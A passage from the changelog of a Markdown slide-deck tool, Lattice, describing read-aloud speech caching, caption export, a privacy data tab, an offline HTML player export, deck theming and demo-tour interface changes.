  row (browsing the list previews it — no separate pick-model-then-pick-voice
  round trip for the common case) and each row's voice count + price shown
  directly. Reuses the chat picker's shared pure helpers
  (`docs/src/playground/tts-catalog.js`, twin of `or-catalog.js` — HARD RULE #15)
  rather than a bespoke `<Select>`.
- **"Play sample" no longer spends OpenRouter credits on every click**, for a
  bounded featured subset of voices per model (51 samples across grok, gemini,
  orpheus, mai-voice-2, zonos-transformer, zonos-hybrid, csm, and voxtral).
  These are pre-generated, repo-committed files a new opt-in generator
  (`tools/generate-voice-samples.mjs`, gated the same way as
  `tools/component-gen-eval.mjs` — HARD RULE #24) produces; `previewTtsVoice()`
  plays the cached file directly instead of hitting the live TTS endpoint —
  instant, free, immune to a slow/hung request. The generator checks
  OpenRouter's live speech-model catalog before spending and skips (never
  breaks) an engine whose model has been discontinued. An uncached voice, an
  uncataloged model, or a non-default speed all still hit the live path (still
  fully functional, just not instant/free). Generating the real samples
  surfaced two live-API findings no documentation could have caught: Gemini's
  speech endpoint only returns raw PCM (the generator requests it and wraps the
  result in a WAV container, reading the real sample rate off the response
  instead of guessing), and a voice id containing `:` (MAI-Voice-2's
  `en-US-Harper:MAI-Voice-2`) needs sanitizing before it can be a filename — a
  literal `:` breaks a Windows checkout of this repo. Kokoro is excluded — free
  on-device already, and the paid hosted-cloud variant was found unreliable
  (timing out) during this round of generation, not worth caching against an
  unstable endpoint. See the redesign section of
  `engineering/decisions/2026-07-09-studio-cloud-ondevice-config-split.md`.
- **Read-aloud no longer re-synthesizes a sentence it's already spoken this
  session.** Replaying a slide (navigate away and back, or just press Play
  again) previously re-fetched every sentence's audio from scratch — same
  cost, same latency, even though nothing changed. `voice-model.js` now
  caches each synthesized clip in memory, keyed on rung + OpenRouter model (or
  the fixed on-device Kokoro model, kept in the key for symmetry) + voice +
  speed + the sentence text itself — changing any one of those five is a
  cache miss, so switching voices or models can never silently replay stale
  audio. A small FIFO cap (200 entries) bounds memory over a long session.
  `previewVoice()` ("Play sample") shares the same cache, so re-sampling an
  already-heard voice/speed replays instantly instead of re-fetching too —
  complementary to, not a replacement for, the pre-generated featured-sample
  cache above (that one is a bounded, repo-committed set for cold-start
  browsing; this one is unbounded, in-memory, and covers actual deck
  narration).
- **Read-aloud no longer has an audible gap between short sentences.** The
  narration pipeline previously synthesized one sentence ahead of playback (a
  one-ahead pipeline) — but that only hides synth latency when the NEXT
  sentence finishes synthesizing before the CURRENT one finishes playing, and
  synth time is roughly network/model-bound while playback time scales with
  the sentence's length. A short sentence (a bullet fragment, a number) plays
  back in under a second, well under typical TTS round-trip latency, so the
  pipe starved and every such transition became its own audible pause.
  `speak()` now keeps up to 3 sentences' synth requests in flight at once
  (`SYNTH_CONCURRENCY`), refilled the moment a slot frees rather than gated by
  playback progress — giving each sentence's audio the maximum possible head
  start instead of just the previous sentence's (often much shorter) slack.
  Playback still plays strictly in original order regardless of which
  request resolves first, and pausing correctly halts any further background
  synthesis (an adversarial review caught an early version of this that kept
  synthesizing the ENTIRE rest of a paused deck in the background — real cost
  on a BYO OpenRouter key, not just a latency nit).
- **Read-aloud no longer double-fires a real TTS request for two identical
  sentences on the same slide** (e.g. a phrase repeated across two bullets).
  The concurrency scheduler above could schedule both occurrences in the same
  batch, and `audioCache` only gets populated once a request RESOLVES — too
  late to help a concurrent duplicate. `speak()` now joins an already
  in-flight request for the exact same (rung, model, voice, speed, text) key
  instead of firing a second one; both occurrences still play their own
  `onSentence`/timing callbacks, they just share the one synthesized clip.
- **Present's "Auto" (autoplay) mode no longer pauses noticeably between
  slides.** The concurrency scheduler above only overlaps sentences WITHIN a
  slide that's already playing — the first sentence of the NEXT slide had
  nothing overlapping it, so every autoplay slide transition paid a full cold
  synth latency the within-slide fix never reached. `voice-model.js` gains
  `warm(sentences)`, a background prefetch that shares `audioCache` and
  `inFlightSynths` with `speak()` (so the two can never race into duplicate
  requests for the same key); Present's autoplay effect
  (`PresentOverlay.tsx`) calls it with the UPCOMING slide's narration as soon
  as the CURRENT slide starts, so the next slide's audio is already cached
  (or in flight) by the time the reader chains to it. `warm()`'s
  `WARM_CONCURRENCY` (1) is a budget for the WHOLE voice-model instance —
  shared via one queue across every `warm()` call, not a fresh allowance
  per call — since Present's autoplay effect re-fires on every slide-index
  change while autoplay is on, including a presenter manually clicking
  Next/Prev a few times in a row, not just autoplay's own advances; a
  per-call-local counter (an earlier draft of this) bounded nothing ACROSS
  those calls, so N rapid navigation steps meant N concurrent real, billed
  requests with no cap at all (a red-team finding, empirically reproduced
  before the fix). Scoped to the `openrouter-tts` rung only — this whole
  prefetch exists to hide NETWORK round-trip latency; Kokoro's on-device
  synthesis is CPU/GPU-bound on one effectively single-threaded worker also
  used by the CURRENT slide's own still-playing narration, so warming the
  NEXT slide there would compete for that resource instead of hiding
  anything (a Munger-inversion finding). An abandoned warm (autoplay turned
  off, the slide advanced again, Present closed) stops firing further
  requests but never cancels one a different still-live caller may have
  joined. Verified live in the real Studio Present overlay via a throwaway
  Playwright script (mocked, delayed TTS endpoint): the next slide's
  sentence requests fire while the current slide is still on screen, not
  only after the transition — and reverting the fix reproduces zero
  requests before the transition. Maker-checker plus the full adversarial
  trio (red team, Munger inversion, independent checker) reviewed this
  twice before merge.
- **The Studio read-along narrates a funnel's conversion rate.** The stage-to-stage
  conversion % is computed at render time (`funnel.transform.js`) and never existed
  in the slide's Markdown, so it was silently absent from every read-aloud. A new
  narration pilot (`docs/src/components/studio/chart-narration.ts`) recognizes a
  `funnel` slide and speaks each stage's value and its conversion rate from the
  prior stage; a hand-authored speaker note still takes priority. Deliberately
  narrow — one component, not a chart-family-wide schema. Same decision doc.
- **The Studio Workspace has a new "Privacy & Data" tab.** Alongside General and
  AI, it surfaces every store the Studio writes to in this browser — decks,
  Library assets (themes/components/finishes/reference docs), the OpenRouter
  connection, downloaded on-device model files (WebLLM / Transformers.js), and
  the offline app cache — with a live count + aggregate size per category
  (KB/MB/GB, since a model download can run to a GB+), a running grand total
  across all four sized categories, and a two-tap delete for each (matching
  the Library's existing delete affordance, and disarmed the moment the sheet
  closes or you switch tabs, so a stale "armed" button can't fire on a later,
  unrelated click). Cache Storage sizes read each cached response's real
  `content-length` (falling back to the blob size), not an estimate. Clearing
  decks reloads the Studio afterward — without it, the live editor's debounced
  autosave would silently rewrite the just-deleted deck straight back into
  localStorage — and the editor also stops autosaving the instant the clear
  fires (`DECKS_CLEARED_EVENT`, `studio-store.ts`), so even a keystroke typed
  in the still-visible editor during the brief reload delay can't slip an
  orphaned write past it. A "Delete everything" action clears all five in one go
  (decks first and unconditionally, then the rest independently, so one
  category hiccuping can't hide what actually got cleared), gated behind a
  dialog that requires typing "delete" to confirm. Preferences (language,
  placement handles, validation toggles, onboarding…) are never touched by any
  Privacy & Data action — it clears data, not settings. New module:
  `docs/src/components/studio/governance.ts`; extended `reference-doc.ts`'s
  `formatBytes` with a GB tier (shared by the refdoc cards and this tab).
- **The read-along narrates three more chart-family gaps.** Following the funnel
  pilot: a `journey weighted` slide speaks each task's share of the slide's total
  volume (computed only under that variant, never authored); a `radar` or
  `quadrant` slide without an explicit eyebrow scale speaks the auto-fit axis
  range it's actually plotted against, so an eyes-free listener isn't left
  guessing whether a value is out of 10 or out of 100; a `state-chart` slide
  speaks its inferred start/terminal states when the author didn't tag them
  explicitly. Eight other chart-family components (piechart, progress, roadmap,
  gantt, timeline-list, map, word-cloud, kanban) were evaluated and got no
  narrator — their meaningful numbers are already authored text, or their
  computed values are rendering geometry with no narratable content. Same
  decision doc, §7.
- **The Studio Share sheet can export read-along captions.** A new **“Captions
  (.vtt)”** row (alongside PDF / PowerPoint / Webpage) reads each slide's speaker
  notes, builds a Cadenza estimate track per narrated slide, and downloads a zip
  with one deck-level `<name>.vtt` (continuous timeline) plus per-slide
  `<name>.NN.vtt` — the same producer the CLI `--captions` flag uses
  (`lib/core/read-along-build.js` + `read-along-vtt.js`), bundled for the browser
  (`docs/src/playground/read-along-core.generated.js`, built by
  `tools/build-read-along-core.js`) the same way the Webpage export bundles
  `player-core.mjs`. No audio, no TTS key — captions only.
- **The Studio Workspace segments AI config into cloud vs. on-device, and ships
  real TTS settings.** Spend/budget now shows only under the Cloud view (on-device
  generation is unconditionally free — there's nothing to cap). Standing
  instructions split into two separate fields: the existing cloud field, and a new
  on-device field capped at 300 characters (a small local model loses the thread
  past a short brief). Output language stays shared across both, as before — it
  describes the deck's language, not which model wrote it. A new **Read-aloud
  voice** section lets you pick the TTS model/voice/speed for each tier — the
  OpenRouter voice catalog for Cloud, a curated Kokoro voice roster (with its
  existing on-device download flow) for On-device — where previously the Studio
  ran a silent "auto" voice ladder with no settings UI at all. Voice pickers are
  **model-specific dropdowns** (Kokoro's own roster, OpenAI's standard six, or a
  free-text fallback for an unrecognized model), not a raw text field, and
  **picking a curated voice plays a sample immediately** so choosing a voice is
  itself a way to hear it — the manual "Play sample" button stays for replaying
  or auditioning free-text ids. Every TTS control (model, voice, speed, preview)
  is disabled with an explanatory hint until that tier actually has a model
  available — connected for Cloud, downloaded for On-device — matching how the
  rest of the Workspace treats an unavailable tier. The Studio's voice prefs also
  moved to their own `lattice-studio-voice-*` keys, so they no longer silently
  share state with the Drawing Board's voice picker — **one-time reset:** if you
  had already picked a non-default voice/speed via the Drawing Board's Settings →
  Voice tab, Studio read-aloud (Present mode's word-synced narration) picked that
  up too via the old shared key; it reverts to the Kokoro defaults once, since the
  two surfaces were never meant to share that setting. See
  `engineering/decisions/2026-07-09-studio-cloud-ondevice-config-split.md`.
- **The Studio can download a deck as a self-contained webpage.** The Share sheet
  gained a **“Webpage (.html)”** row (alongside PDF / PPTX / Print) that assembles
  the same offline `.html` player the CLI `--player` flag produces — three views
  (Present · Read·Slides · Read·Article), a sha256-pinned CSP, and the verbatim
  source envelope for lossless re-import — entirely in the browser. It reuses the
  shared assembler (`lib/export/player-core.mjs`) with browser capabilities. Part of
  `engineering/decisions/2026-07-08-studio-html-player-export.md` (P2).
- **The Studio webpage export is now pruned to the deck’s used styles + fonts.** It
  runs the same used-selector CSS prune and used-family font prune the CLI applies —
  the shared kernel (`lib/export/player-prune.js`) against an offscreen full-deck
  render, behind the same computed-style safety gate (any mismatch ships the full
  stylesheet). A typical deck’s download drops from ~1.6 MB to ~0.55 MB. Fonts ship
  full (un-subset) in the browser; glyph-subsetting stays CLI-only for now. Same
  decision doc (P2b).
- **The webpage export can strip speaker notes.** Its options step gained a **“Strip
  speaker notes”** toggle (default off — notes ride into the player’s Present-mode
  notes sheet, matching the CLI). Turned on, it scrubs the note text from every copy
  in the shared file — the DOM asides and the re-import envelope source — mirroring
  the CLI `--strip-notes`; accessible slide descriptions are kept. Same decision
  doc (P3).
- **The export manifest can now carry a read-along.** The Lattice document manifest
  (`lib/core/lattice-doc.js`) gained an optional `readAlong` section — voice config
  plus an optional per-slide measured caption track — carried through export/import
  byte-exact. Additive and forward-compatible: decks without a read-along are
  unchanged, and older importers ignore it. Plumbing for the read-along export
  contract (`engineering/decisions/2026-07-08-read-along-export-manifest.md`); no
  exporter populates it yet.

- **The CLI exports read-along captions.** `lattice deck.md deck.pdf --captions`
  writes WebVTT sidecars from the speaker notes — one deck-level `<output>.vtt`
  (continuous, deck-absolute timeline) plus per-slide `<output>.NN.vtt`, alongside any
  output format (the `.vtt` never touches the deck's bytes). Timing is Cadenza's
  offline estimate (no audio, no TTS key); honors `--strip-notes`. Demo deck:
  `examples/read-along-captions.md`. Completes the read-along export contract's
  regenerate path (`engineering/decisions/2026-07-08-read-along-export-manifest.md`).

- **The export derives a WebVTT caption sidecar from a read-along.**
  `lib/core/read-along-vtt.js` turns a manifest `readAlong` section into WebVTT — one
  deck-level `.vtt` (each slide offset by prior durations) or per-slide files. It
  consumes Cadenza's `toVtt` from the built `@slidewright/cadenza` workspace package —
  one source of truth (the former node-loadable hand-mirror is retired).

- **A shared producer assembles a read-along from a deck's narration.** `buildReadAlong`
  (`lib/core/read-along-build.js`, root CJS — consumed by both the CLI and the docs)
  turns per-slide narration text into the `readAlong` section: voice config plus a
  Cadenza estimate track per narrated slide (blank slides skipped, sparse by index).
  Pure and offline (no key, no audio); an end-to-end test proves the chain
  (build → manifest round-trip → deck `.vtt`) composes.

- **Deck theme + color mode are now independent of the website.** A deck's own
  `theme:` front matter is always respected when previewing or exporting on the docs
  site (Studio, Playground, Present, Share) — the website palette picker only styles
  the app chrome and any deck that declares no `theme:` of its own. Changing the
  website palette no longer restyles a self-themed deck, and a deck's theme never
  re-tints the app. Light/dark stays a shared axis, except a deck that pins its mode
  (`class: dark` / `class: light`, or a `-dark` theme) keeps it regardless of the
  site. Precedence lives in one shared resolver (`docs/src/lib/deck-theme.ts`). See
  `engineering/decisions/2026-07-08-deck-theme-independence.md`.
- **A per-slide (and deck-wide) `light` canvas — the mirror of `dark`.**
  `<!-- _class: light -->` forces one slide to a light canvas, and `class: light`
  does it deck-wide — so a bright slide can sit inside a dark deck (and vice-versa).
  A per-slide pin wins over the deck-wide one. In the Studio, the Inspector's
  **Appearance** control now sets the deck's color mode (Match site / Light / Dark),
  writing this front matter; the topbar Sun/Moon remains the website light/dark.
- **The Studio slide drawer pins a slide's canvas with a Light control, not just Dark.**
  The per-slide **Look → Canvas** control is now a three-way **Auto / Light / Dark**
  selector (was a Dark-only toggle): Auto follows the deck (or site), while Light or
  Dark pins *this* slide regardless — so someone reading in dark mode can force one
  slide to a light surface. Auto shows the deck value it would inherit as a hint, and
  Light/Dark are mutually exclusive (setting one clears the other).
- **The Studio Inspector's Theme control now sets the DECK's theme.** It reads/writes
  the deck's own `theme:` front matter with an "Automatic — match site" option that
  clears it (the topbar picker stays the website theme). The Appearance control also
  reflects a deck pinned dark by a `-dark` theme name, not only by `class:`.
- **The Studio editor autocompletes theme names and slide modifiers.** Typing a
  `theme:` front-matter value suggests the palettes (built-in + your saved themes); a
  `class:` (deck-wide) or `<!-- _class: … -->` (per-slide) value suggests the universal
  modifiers — `dark`, **`light`**, `numbered`, tone/stamp styles, … — pulled from the
  same lint vocabulary the editor validates against, so they never drift.
- **A self-contained HTML player export — `--player`.** `lattice-emulator deck.md
  out.pdf --player` (or a `player: true` front-matter key) now writes the `.html`
  sidecar as a portable, offline, double-clickable **player**: one file that *is*
  your deck. It carries three views — **Present** (fit-scaled, arrow-key
  navigation), **Read · Slides** (every slide stacked in a scrolling column), and
  **Read · Article** (a Typora-style document with a left table of contents) —
  switchable from a top bar, with a dark/light toggle that re-themes the whole
  document. Everything is inlined (fonts, images, and diagrams — including
  browser-drawn **state machines and plotted functions**, baked to static SVG at
  export), so it makes **zero network requests**; the slide HTML is sanitized and
  pinned behind a strict
  `sha256` content-security policy; **the CSS is minified and pruned to only the
  selectors the deck actually uses, and the embedded fonts are pruned to the families
  the deck actually uses and glyph-subset to its characters (optional `subset-font` /
  `css-tree` dependencies; full fonts / full CSS if they aren't installed)** — a
  boardroom deck drops the inlined stylesheet from ~452 KB to ~33 KB and the ~267 KB
  hand-drawn `sketch` fonts it never touches, taking the file from ~1.8 MB to ~0.4 MB.
  Font pruning is **authoritative and honors `sketch`**: a face is kept when the
  browser actually loaded it or its family is referenced, so a deck that uses the
  sketch hand keeps Caveat + Shantell while a deck that doesn't, drops them. The CSS
  prune is verified safe on a frozen file by a computed-style gate: the pruned CSS
  must render every element pixel-identically across all three views or the full CSS
  ships instead. The exact deck source rides along in a
  tamper-safe envelope so the file re-opens into Lattice losslessly. Demo:
  `examples/html-player.md`. Read · Article is **component-aware**: it reads the
  semantic slide DOM and gives each component its natural prose form — KPI/stat
  blocks become bold value → label pairs, quotes keep their citation, charts and
  diagrams become captioned figures, tables and nested lists stay intact — with
  every slide in the left table of contents. (Deeper per-component fidelity for the
  remaining buckets continues.) See
  `engineering/decisions/2026-07-07-html-lattice-player.md`.
- **The Studio "Watch demo" becomes "Show Me" — a five-tour guided library.** One engine, five
  angles on the same Studio, each launchable from a "Show Me" menu (the top bar on desktop/tablet;
  inlined in the ⋯ menu on a phone): **First look** (the sixty-second version), **The full
  walkthrough** (write · polish · ship, the default), **Build a board deck** (the 4 o'clock meeting,
  with stakes), **It's just Markdown** (one promise, proven five ways), and **The quiet tour** (few
  words, let the slides talk). Each is ONE responsive script — the same tour adapts to the phone's
  single swappable pane vs. the desktop side-by-side — built from a shared tour toolkit and paced by
  the new Teaching Beat (below). Verified on real Chromium at both widths (full walkthrough builds +
  completes; every tour smoke-launches). Retires the two single storyboards the tours supersede.
- **Present mode in the exported `.html` player gains touch-swipe, fullscreen, PageUp / PageDown / Home / End,
  and a dynamic-viewport (`dvh`) fit.** You can now present straight from the shared file: swipe left/right to
  turn slides on a touchscreen, tap the new ⛶ control for true fullscreen, and the stage fills the dynamic
  mobile viewport (toolbars no longer clip it) with the slide correctly centered on narrow screens (it
  previously sat off-screen on a phone), re-fitting on orientation change. Keyboard nav adds
  PageUp/PageDown/Home/End (previously only ← / → / space). The player's slide transport runs on the shared
  headless kernel (`lib/core/present-transport.mjs`) — the one source of truth for the fit-scale, index/bounds,
  keymap, and swipe maths that the presenter, practice, and export transports had each reimplemented. Desktop
  slide scaling is byte-identical.
- **Speaker notes in the player — with a `--strip-notes` privacy export.** Present *from* the file: your
  speaker notes ride along by default and a slide-up notes sheet (toggle: the ☰ control or the `n` key)
  shows the current slide's note over the stage. For a file you're sharing, `lattice-emulator deck.md out.pdf
  --player --strip-notes` scrubs the note text from **every** baked copy — the slide DOM, the PDF
  annotations, and the embedded source envelope — so nothing leaks (a stripped file re-imports without notes,
  the stated privacy tradeoff). The note/non-note boundary and the source scrub both go through the one
  `notes-core` module.

### Changed

- **The Studio desktop chrome consolidates onto ONE left activity bar.** Every
  panel now launches from a single VSCode-style activity bar on the left and docks
  beside it — Settings next to the bar, the Architect next to the editor
  (`[ bar ][ Settings ][ Architect ][ editor ][ preview ]`). This retires the old
  five-affordance collapse sprawl (the scope-rail Slide/Deck buttons, the rail
  collapse chevron, the 72⇄48 width toggle, and two in-panel echo chevrons) and the
  Architect's homeless top-bar toggle: one collapse rule now governs every panel —
  click its bar icon to show it, click again to hide it (gone, not a rail stub).
  The Architect and the settings scopes are independent groups, so the coach stays
  up while you tune; both docked panels are resizable and their widths persist, and
  they auto-narrow before the editor+preview pair can clip at narrow desktop widths.
  Tablet and mobile keep their existing sheet chrome (the bar is a desktop
  construct). The Architect chat now keeps its history AND its unsent draft through
  a close (including an in-flight reply), so nothing is lost when the panel goes
  away. See `engineering/decisions/2026-07-06-studio-activity-bar.md`.
- **Showcase renders can no longer drift from the engine (#794).** The
  comparison page's slide figure (and the whole manifest-flagged showcase set
  under `docs/public/showcase/`) is generated from committed gallery PDFs by
  `docs/scripts/rasterize-showcase.mjs`, but its `--check` only verified
  *presence* — so when the engine, a theme, or a component's sample changed,
  the page kept serving the old render (the set sat frozen since late June
  with stale sample copy and a since-fixed kpi header collision baked in). The
  script now
  records each gallery PDF's sha256 in `docs/scripts/showcase-sources.json` at
  generation and `showcase:check` (already first in the docs build) fails on
  any source-hash mismatch, a flagged-but-unrecorded component, an orphan
  record, or a zombie WebP no flagged component produces — outputs are still
  not byte-compared (WebP encoding varies across libvips versions; source
  hashes are environment-independent). All 30 WebPs are regenerated from the
  current engine; the un-flagged `before-after` pair is deleted; and the
  comparison page's figure now uses the shared, gated `showcase/funnel.*` pair
  instead of its own copy under `docs/public/comparison/` (removed).

- **The comparison page leads with the argument, not the scoreboard.** It now
  opens with the problem, what a deck should be, the four commitments the render
  path keeps, and a reframe of speed (fast to a draft is not fast to a deck)
  before the honest, sourced field comparison — so Lattice reads as a
  deterministic-craft position, not one more slide tool. Competitor claims are
  re-verified against primary sources (the Deloitte figure is the contract value,
  not the refund; the fact-check receipt names the tools that scored higher), the
  git framing is demoted so it reads as manageability rather than developer-only,
  and `features.astro` is reconciled to "500+ models."
  A follow-up integrity + capability pass: the unsourceable "Marp's own docs say"
  quotation becomes an honest paraphrase (the root claim in the competitive-analysis
  decision doc is corrected too); the flat-image PPTX export is disclosed as its own
  weakness card since we ding Gamma for the same shape; the Studio, Fabricate, and
  the finish layer join the page (a new "Deck review built in" matrix row, Studio
  mentions in the warts and the Marp answer); the matrix's ○ marks use a text token
  so they survive dark mode; the mobile matrix gets a right-edge fade and a swipe
  hint; the display-font classes are repaired (they compiled to an invalid
  `font-weight`); the Tome receipt no longer contradicts its neighbor's timeline;
  "Send a correction" is now a link; and the marketing footers point at the Studio
  instead of the frozen Drawing Board and Workbench.
  The page also shows the product — a funnel slide pair (light + dark, same
  Markdown, one palette line apart) in "What we believe." The pair is page-owned
  (`docs/public/comparison/`) and rasterized from the component's committed
  gallery PDF, so it is the *current* engine's render: the Studio's `showcase/`
  seed assets turned out to be a frozen late-June snapshot that had drifted from
  the engine (stale sample copy and styling, caught by the owner on a real phone).

- **Vetrina: a caption can be a lesson, not a subtitle — the Teaching Beat.** A storyboard beat can
  set `read: true`: after the caption shows, the cursor dips to the narration dock and the words
  glow-pulse (drawing the eye — the teacher underlining what they said), and the beat DWELLS long
  enough to READ — timed to the caption's word count via the new `readMs()` — BEFORE the action
  runs. So a viewer understands the words first, then watches the thing happen, at a human,
  patient pace instead of a feature-recital rush. The pulse is motion-safe (plays under `legible`);
  the cursor dip teleports when vestibular motion is suppressed. Backward compatible — a beat
  without `read` is unchanged.

- **The mobile Playground is stripped back to the deck.** The Explore/Edit pills
  become a compact two-icon toggle (◱ view · ✎ edit); the five toolbar icons
  collapse to two (Deck setup — with the debug overlay folded in — and
  Galleries); the walk chip strip and the Variant select merge into one **Step**
  dropdown listing every slide; and "Edit this slide" plus "Read this slide's
  copy" are removed. Explore and Edit are now two views of the same deck —
  Explore renders it, ✎ opens its markdown, and editing reflects straight back —
  so flipping to Edit gives you the slide's source without a dedicated button.
  Edit is a full-height editor (no Markdown/Preview tabs on mobile; the desktop
  split stays), and the walk bar pins to the bottom so the deck dominates.
  Design: `engineering/decisions/2026-07-06-playground-simplify.md`.

- **The Playground toolbar is redesigned clean and responsive (mobile · tablet ·
  desktop).** One tidy centered row on wide screens — the stacked uppercase
  picker labels are retired (sr-only; each control carries its own placeholder +
  aria-label), so the whole bar keeps a single 32px height; two tidy rows on a
  phone (mode + actions on top, the two pickers below). The `RENDERED SLIDES` /
  `MARKDOWN` pane label is hidden wherever it's noise (Explore, and mobile
  single-pane) and kept only on the desktop Edit split where it names two panes.
  New **Focus** control (⤢) hides the whole toolbar so the deck or editor owns
  the full height — a floating pill (⤡) brings it back; the walk bar stays, so
  Explore's stepping is never lost. Focus persists at every width and is seeded
  pre-paint (no toolbar flash on return). In Explore the walked slide now **fits
  the pane** — on a wide screen (an iPad's landscape Explore) the slide was
  scaled to the pane width and its bottom fell below the fold; it's now capped to
  the pane height and centered, so a whole slide is always visible (a portrait
  phone is unchanged — the short slide already fit). Explore now reads
  **bottom-first at every width** (mobile → tablet → desktop): the walk bar
  (Prev · N/M · Next + caption) pins to the bottom, the deck fills the band
  above, and the only scroll is inside the deck iframe. The **Deck setup** button
  is renamed **Deck Setting**.

- **Vetrina: `prefers-reduced-motion` now keeps the demo watchable instead of collapsing
  it.** Motion is a three-tier policy (`theme.motion`, default `'system'`): `full` plays
  everything; `legible` suppresses only *vestibular* motion (cursor glides teleport,
  expanding rings / orbit / drag sweeps skip, the hand-wave becomes an in-place pulse) but
  keeps the *content cadence* a viewer reads by — the typing reveal, caption cross-fades, and
  full reading settles — and opens with a motion-safe greeting; `still` collapses everything
  to instant (the old behavior, now an explicit opt-in). `'system'` resolves a reduced-motion
  device to **`legible`, never `still`**, because WCAG 2.3.3 / Apple HIG target vestibular
  triggers, not typing or a cross-fade. Fixes the reduced-motion iPhone demo racing past in an
  unwatchable instant blur with no greeting. The stage exposes `stage.reduced` (vestibular
  suppressed) and `stage.still` (content collapsed); the runner/storyboard gate the typing
  reveal + default settle on `still`, so `legible` keeps them.

- **The Studio demo's "watch it build" beats sync on the real parse, not a timer.**
  Each slide the demo types now waits on `until(() => railReady(k))` — the slide rail
  gaining its Kth button — before typing the next, instead of a fixed settle that
  raced the ~400ms editor→deck debounce. Editor and preview stay in sync regardless
  of machine speed (a slow box no longer risks the next slide typing before the
  previous one renders). Dogfoods Vetrina's `until` advance gate in the flagship
  walkthrough; verified by the six-scenario demo e2e on real Chromium.

### Changed

- **Studio mobile: swapping Edit ⇄ Preview is now instant.** The two panes previously
  unmounted each other, so every swap to Preview **remounted and reloaded** the preview
  iframe — a blank flash and a repaint. Both panes now stay mounted (the inactive one
  hidden with `visibility:hidden` + `inert`), so the preview keeps rendering the live deck
  while hidden and a swap shows it immediately (~85 ms, no reload). This also makes the
  phone Watch-demo's per-slide reveal snap in instead of racing an iframe reload.

### Added

- **Three `list-steps` variants for a vertical staged-argument flow —
  `chevron`, `converge`, `ghost`.** A labelled sequence that cascades *down* the
  frame (Problem → Vision → … → Plan), authored as a plain numbered list with a
  one-line body per stage. `chevron` gives an accent down-chevron tab keyed into
  a description card (a boardroom-clean take on the classic persuasion frame);
  `converge` renders one continuous tapering silhouette narrowing onto the final
  stage — the qualitative sibling of the chart `funnel`, use it when the stages
  narrow onto a decision; `ghost` is an editorial treatment with a faint chevron
  watermark, an eyebrow label, and a hero one-line description. All three are
  palette-blind (verified light + dark) and self-contained (no companion
  `vertical` needed); the stage label is slot-label-lifted so no `**bold**` is
  required. Demo deck: `examples/staged-flow.md`.
- **Vetrina: the narration dock is now a configurable style (`theme.caption`).** Four
  curated looks — `'bar'` (full-width caption bar, the default), `'split'` (a clean
  text-only caption + a corner Exit chip), `'scrim'` (no box — a film-subtitle over a
  soft gradient), and `'progress'` (the bar with a beat-progress ring in place of the
  live dot, fed by a new `stage.progress(beat, total)` the storyboard interpreter
  reports). Every style keeps Exit an always-reachable icon **inside** `.vetrina-caption`
  and one narration live region, so the take-over guard and a11y contract are unchanged.
  Exit is now an ✕ **icon** in all styles (was a text button), which reclaims the width a
  phone caption needs. The Studio demo opts into `'scrim'` on **phones** (its short beats ride
  the dark bottom of the mobile preview) and the centered `'bar'` on desktop/tablet (light
  preview, longer narration); every other Vetrina consumer keeps the universal `'bar'` default.
  `'bar'` is responsive — near-full-width on a phone, a centered pill capped at 680px on a wide
  screen. The scrim's darkening is a themeable `--vt-caption-scrim` token; the boxed styles'
  corner radius default is now `16px` (raise `--vt-caption-radius` to `999px` for a stadium pill).
- **The Studio "Watch demo" now runs on phones — a preview-first single-pane demo.**
  The self-driving walkthrough previously covered desktop + tablet only; on a phone
  (≤699px) the Studio shows one swappable Edit/Preview pane, so the side-by-side
  choreography couldn't play. The phone gets its own storyboard: it taps the real
  Edit/Preview toggle and **alternates per slide** — type a slide on Edit, tap Preview
  to reveal it, repeat — building a tight four-slide "My First Deck" (a title, a
  big-number, a radar chart, and a close) so it stays short and punchy on a small
  screen. It dogfoods Vetrina's `until` gate to survive the editor unmounting on each
  pane-swap (typing is held until the editor remounts), and reuses the same reskin →
  Coach → Present → Share beats as sheets. The launch affordance is re-enabled on
  phones (first-run banner + a persistent "Watch demo" in the ⋯ menu). Mechanics are
  verified on real 390px Chromium (two mobile e2e oracles: the four slides land in
  order across every swap; a real tap takes over); real-iPhone touch/iOS sign-off is
  still owed (HARD RULE #23).
- **The Playground opens on Explore — the Specimen Book's reader (PR 6).** The
  generated component galleries are now walkable in place: an Explore | Edit
  mode pill, a Walk bar with Prev/Next, "slide N of M", the slide's own caption,
  and full-word labeled step chips (Title, Default, each variant by name, Stress
  test, compositions, Anti-patterns, See also); the last slide flows into the
  next component so the whole catalog reads as one continuous walk (Shift+←/→
  jumps components). The Variant select becomes a jump list while exploring;
  "Edit this slide" drops the current slide into the editor (arm-to-confirm over
  a dirty draft, backed up with Undo); phones get thumb-size stepping and a
  "Read this slide's copy" transcript at body size. Walk plans ship as
  `plans/<name>.json`, generated from the same `galleryPlan(m)` the committed
  PDFs render — the walk order cannot fork — and a deploy mid-session surfaces a
  "site updated — reload" toast instead of a dead Next button. New URL scheme
  `?c=<component>&view=read&s=<step>` (stale keys fall back with a notice, never
  a blank frame); docs-reference variant buttons deep-link into the walk; the
  site command menu gains "Start walkthrough"; the tour is rewritten mode-aware
  and ends inside the Playground. Explore never writes the draft. A pristine or
  first visit opens Explore; a dirty draft, a handoff, or `?view=edit` opens the
  editor. The phone pane tabs are relabeled Markdown | Preview.
- **Vetrina: instant beats + advance control.** A storyboard/`scene()` beat can be
  marked `instant` — its `act`/`type` apply immediately with **no cursor movement,
  no typing animation, no gesture, no settle** (the declarative equivalent of a raw
  `Walkthrough` poking a setter directly); ideal for setup, closing an overlay, or
  jumping ahead. An `instant` beat that also carries a `point`/`gesture` warns at build
  time (those verbs are dropped), and a *mostly*-instant walkthrough is a documented
  anti-pattern. Three ways to gate **when the next beat starts**, by what the app
  exposes: `settle` (a fixed pause, now honored on instant beats too); an **async
  `act`** for a promise readiness (the step already awaits it); and `until(() => cond)`
  for a **non-async, pollable** readiness (a DOM flag with no promise) — a declarative,
  abort-safe gate that keeps that wait in the descriptor layer so authors never drop to
  the raw API. `until` is **throw-safe** (a predicate that throws while its element is
  null = "not ready yet") and on a ~15s timeout **advances with a `console.warn`**
  (naming the last predicate error) — never silent, but never fatal, so a backgrounded
  tab or a slow app can't self-destruct the run. The Studio demo's silent "close
  overlay" beats now use `instant`. Fluent verbs `.instant()` / `.until(pred)`; the
  trust invariant (act is awaited, its failure routes to `onStop('error')`) is
  unchanged. Designed and hardened by two adversarial trios (red team + Munger inversion
  + independent checker) — see decision doc §14-3 and §14-4.

### Fixed

- **The docs site no longer stalls on a render-blocking Google-Fonts request.** The
  site chrome (`landing.css` / `lattice.css`) pulled Playfair Display / Outfit /
  JetBrains Mono from Google Fonts via a remote CSS `@import`, which blocks first
